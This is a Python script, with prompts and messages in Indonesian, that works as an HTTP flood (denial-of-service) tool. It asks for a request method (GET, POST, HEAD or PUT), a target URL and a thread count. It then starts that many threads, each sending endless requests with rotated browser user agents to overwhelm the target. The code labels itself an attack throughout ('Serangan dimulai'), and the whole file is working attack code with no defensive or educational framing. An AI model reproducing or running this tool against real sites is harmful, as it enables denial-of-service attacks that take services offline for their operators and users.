import requests
import threading
import random
import time
from colorama import Fore, Style, init

init(autoreset=True)

dummy_data = {"key": "value"}

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
]

def send_get_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[ Thread-{thread_id} ] GET berhasil ke {url}")
            else:
                print(Fore.RED + f"[ Thread-{thread_id} ] GET gagal dengan status code: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] GET gagal: {e}")

def send_post_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.post(url, data=dummy_data, headers=headers, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[ Thread-{thread_id} ] POST berhasil ke {url}")
            else:
                print(Fore.RED + f"[ Thread-{thread_id} ] POST gagal dengan status code: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] POST gagal: {e}")

def send_head_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.head(url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[ Thread-{thread_id} ] HEAD berhasil ke {url}")
            else:
                print(Fore.RED + f"[ Thread-{thread_id} ] HEAD gagal dengan status code: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] HEAD gagal: {e}")

def send_put_request(url, thread_id):
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.put(url, data=dummy_data, headers=headers, timeout=5)
            if response.status_code == 200:
                print(Fore.GREEN + f"[ Thread-{thread_id} ] PUT berhasil ke {url}")
            else:
                print(Fore.RED + f"[ Thread-{thread_id} ] PUT gagal dengan status code: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[ Thread-{thread_id} ] PUT gagal: {e}")

def main():
    print(Fore.YELLOW + """
\033[1;31m1. \033[1;36mGET
\033[1;31m2. \033[1;36mPOST
\033[1;31m3. \033[1;36mHEAD
\033[1;31m4. \033[1;36mPUT
\033[1;37m""")
    method = input(Fore.CYAN + "Pilih metode serangan (1-4):\033[1;37m ").strip()
    url = input(Fore.CYAN + "Masukkan URL target:\033[1;37m ").strip()
    threads = int(input(Fore.CYAN + "Masukkan jumlah thread:\033[1;37m "))

    print(Fore.YELLOW + f"[ INFO ] Memulai serangan ke {url} dengan {threads} thread...")
    time.sleep(1)

    if method == "1":
        print(Fore.GREEN + "[ INFO ] Serangan GET dimulai!")
        for thread_id in range(1, threads + 1):
            thread = threading.Thread(target=send_get_request, args=(url, thread_id))
            thread.daemon = True
            thread.start()
    elif method == "2":
        print(Fore.GREEN + "[ INFO ] Serangan POST dimulai!")
        for thread_id in range(1, threads + 1):
            thread = threading.Thread(target=send_post_request, args=(url, thread_id))
            thread.daemon = True
            thread.start()
    elif method == "3":
        print(Fore.GREEN + "[ INFO ] Serangan HEAD dimulai!")
        for thread_id in range(1, threads + 1):
            thread = threading.Thread(target=send_head_request, args=(url, thread_id))
            thread.daemon = True
            thread.start()
    elif method == "4":
        print(Fore.GREEN + "[ INFO ] Serangan PUT dimulai!")
        for thread_id in range(1, threads + 1):
            thread = threading.Thread(target=send_put_request, args=(url, thread_id))
            thread.daemon = True
            thread.start()
    else:
        print(Fore.RED + "[ ERROR ] Pilihan metode tidak valid. Silakan pilih antara 1-4.")
        return

    print(Fore.GREEN + "[ INFO ] Serangan telah dimulai! Tekan Ctrl+C untuk berhenti.")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
